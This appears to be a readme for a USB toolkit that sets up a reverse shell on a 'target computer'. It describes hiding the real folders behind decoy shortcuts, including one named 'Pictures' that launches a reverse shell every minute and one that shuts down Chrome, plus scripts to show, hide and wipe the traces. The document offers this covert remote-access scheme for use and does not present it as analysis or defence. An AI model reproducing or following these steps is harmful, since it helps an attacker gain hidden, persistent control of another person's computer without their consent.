Copy the files to a USB. Then, run the setup file to set up reverse shell, 
hide the folders, and move the setup.bat and readme.txt into the hidden
folders. after running the setup file, the folders will not be visible  
(only the "shortcuts" will be). The only way to get into the folders 
after they are hidden is by typing the directory of the hidden folder into 
the explorer bar, or, using cmd, cd into the current directory then type 
[other\control\ShowFolders.bat]. To hide them again, cd into the current directory then type 
[other\control\HideFolders.bat]. To delete all damage from the target computer,
type [other\control\Delete.bat]. To re-setup the usb, type [other\control\reset.bat].


What each shortcut does:

[Writing] = Google Chrome shutdown shortcut
[Pictures] = Reverse shell that runs every minute
[School] = regular folder